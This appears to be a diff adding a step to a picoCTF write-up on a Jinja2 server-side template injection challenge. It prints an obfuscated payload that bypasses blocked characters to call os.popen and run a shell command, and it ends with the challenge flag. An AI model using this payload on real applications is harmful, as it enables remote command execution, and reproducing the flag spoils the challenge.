@@ -34,4 +34,15 @@ _Blocked Characters:_
 And after so many trial and error I manage to found a correct obfuscated payload from this [source](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/):
 
 
+#### Third Step 
+
+I found this payload 
+
+{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+
+I then found that there is this 
+
+
+
+
 Flag : picoCTF{sst1_f1lt3r_byp4ss_a9824e27}
